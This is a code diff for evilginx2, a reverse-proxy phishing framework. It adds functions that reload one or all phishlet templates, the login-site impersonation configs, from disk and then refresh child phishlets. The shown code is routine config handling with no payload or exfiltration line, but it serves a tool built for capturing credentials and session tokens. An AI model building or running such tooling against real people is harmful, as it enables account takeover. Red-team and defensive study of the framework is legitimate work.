@@ -5,6 +5,7 @@ import (
 	"net/url"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 
 	"github.com/kgretzky/evilginx2/core/antibot/infra"
@@ -861,6 +862,76 @@ func (c *Config) DeleteSubPhishlet(site string) error {
 	delete(c.phishletConfig, site)
 	c.SavePhishlets()
 	return nil
+}
+
+func (c *Config) ReloadPhishlet(site string) error {
+	pl, err := c.GetPhishlet(site)
+	if err != nil {
+		return err
+	}
+	if pl.ParentName != "" {
+		return fmt.Errorf("'%s' is a child phishlet — reload its parent '%s' instead", site, pl.ParentName)
+	}
+	new_pl, err := NewPhishlet(site, pl.Path, nil, c)
+	if err != nil {
+		return err
+	}
+	c.phishlets[site] = new_pl
+	c.VerifyPhishlets()
+	return nil
+}
+
+func (c *Config) ReloadAllPhishlets() (reloaded int, failed int) {
+	pr := regexp.MustCompile(`^([a-zA-Z0-9\-\.]+)\.yaml$`)
+	files, err := os.ReadDir(c.phishletsDir)
+	if err != nil {
+		log.Error("reload: cannot read phishlets dir: %v", err)
+		return
+	}
+	for _, f := range files {
+		if f.IsDir() {
+			continue
+		}
+		m := pr.FindStringSubmatch(f.Name())
+		if len(m) < 2 || m[1] == "" {
+			continue
+		}
+		pname := m[1]
+		if existing, ok := c.phishlets[pname]; ok && existing.ParentName != "" {
+			continue
+		}
+		pl, err := NewPhishlet(pname, filepath.Join(c.phishletsDir, f.Name()), nil, c)
+		if err != nil {
+			log.Error("reload: '%s': %v", f.Name(), err)
+			failed++
+			continue
+		}
+		if _, exists := c.phishlets[pname]; !exists {
+			c.phishletNames = append(c.phishletNames, pname)
+		}
+		c.phishlets[pname] = pl
+		reloaded++
+	}
+	// refresh child phishlets from their (now-updated) parents
+	for _, pl := range c.phishlets {
+		if pl.ParentName == "" {
+			continue
+		}
+		parent, ok := c.phishlets[pl.ParentName]
+		if !ok {
+			continue
+		}
+		params := pl.customParams
+		new_pl, err := NewPhishlet(pl.Name, parent.Path, &params, c)
+		if err != nil {
+			log.Error("reload child '%s': %v", pl.Name, err)
+			continue
+		}
+		new_pl.ParentName = pl.ParentName
+		c.phishlets[pl.Name] = new_pl
+	}
+	c.VerifyPhishlets()
+	return
 }
 
 func (c *Config) LoadSubPhishlets() {
